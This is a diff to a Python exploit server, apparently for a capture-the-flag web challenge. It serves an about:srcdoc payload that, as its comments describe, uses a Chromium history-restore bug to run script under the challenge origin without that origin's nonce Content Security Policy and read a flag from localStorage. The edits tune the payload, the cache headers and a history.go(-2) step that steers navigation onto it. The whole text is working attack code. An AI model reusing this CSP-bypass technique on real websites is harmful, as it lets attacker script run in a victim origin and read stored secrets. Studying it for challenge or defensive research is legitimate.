@@ -15,12 +15,13 @@ def cu(content):
     return CHAL + '/?content=' + urllib.parse.quote(content, safe='')
 
 def payload():
-    # Stored first as a no-CSP B-origin about:srcdoc document.  On vulnerable
-    # Chromium it is restored below an A-origin parent while retaining B's old
-    # policy container, so this executes as A without A's nonce CSP.
+    # First committed as a no-CSP attacker-origin about:srcdoc document.
+    # The vulnerable restore later gives it the current challenge parent origin
+    # while retaining this historical no-CSP policy container.
     return '''<!doctype html><meta charset=utf-8><script>
-console.log('[chronostasis] EXEC origin='+location.origin+' flag='+localStorage.getItem('flag'));
-console.log('[chronostasis] FLAG='+localStorage.getItem('flag'));
+const __f = localStorage.getItem('flag');
+console.log('[chronostasis] EXEC origin='+location.origin+' href='+location.href+' hist='+history.length+' flag='+__f);
+console.log('[chronostasis] FLAG='+__f);
 </script>'''
 
 def stage1():
@@ -46,6 +47,7 @@ class H(BaseHTTPRequestHandler):
         self.send_response(code)
         self.send_header('Content-Type','text/html; charset=utf-8')
         self.send_header('Cache-Control','no-store, no-cache, must-revalidate')
+        self.send_header('Pragma','no-cache')
         self.send_header('Content-Length',str(len(body)))
         self.send_header('Connection','close')
         if headers:
@@ -73,9 +75,12 @@ class H(BaseHTTPRequestHandler):
                 d=stage2_destination(); print('[+] stage redirect ->',d,flush=True)
                 self.sendb(302,headers={'Location':d})
             return
-        if u.path=='/dummy': self.html('<!doctype html>dummy'); return
+        if u.path=='/dummy':
+            self.html('<!doctype html><meta charset=utf-8>dummy'); return
         if u.path=='/back':
-            self.html("<!doctype html><script>console.log('[chronostasis] BACK hist='+history.length);setTimeout(()=>history.back(),200)</script>")
+            # Joint history is: srcdoc payload -> /dummy -> /back. One back only
+            # lands on /dummy and stalls. Jump two entries directly to srcdoc.
+            self.html("<!doctype html><meta charset=utf-8><script>console.log('[chronostasis] BACK hist='+history.length);setTimeout(()=>history.go(-2),150)</script>")
             return
         if u.path=='/status': self.html('ok'); return
         self.html('nf',404)
